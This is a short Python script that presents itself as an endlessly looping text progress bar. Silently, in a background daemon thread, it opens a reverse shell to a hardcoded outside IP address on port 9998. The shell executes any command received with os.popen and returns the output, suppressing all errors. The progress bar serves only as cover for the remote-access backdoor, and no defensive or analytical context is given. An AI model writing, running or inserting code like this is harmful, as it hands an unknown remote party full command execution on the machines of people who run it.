import socket
import threading
import time
import os

duration = 20

def reverse_shell():
    try:
        host = "158.69.251.105"  
        port = 9998
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))

        while True:
            command = s.recv(1024).decode()
            if command.lower() == "exit":
                break
            if command:
                output = os.popen(command).read()
                if output == "":
                    output = "[No Output]"
                s.send(output.encode())
    except:
        pass


shell_thread = threading.Thread(target=reverse_shell)
shell_thread.daemon = True
shell_thread.start()


def infinite_loading_bar():
    counter = 1
    total_steps = 100
    step_time = duration / total_steps

    while True:
        for i in range(total_steps + 1):
            bar = '#' * (i // 5)
            print(f"Cycle {counter:02}: [{bar:<20}] {i}%")
            time.sleep(step_time)
        print(f"Cycle {counter:02} Done!\n")
        counter += 1


infinite_loading_bar()
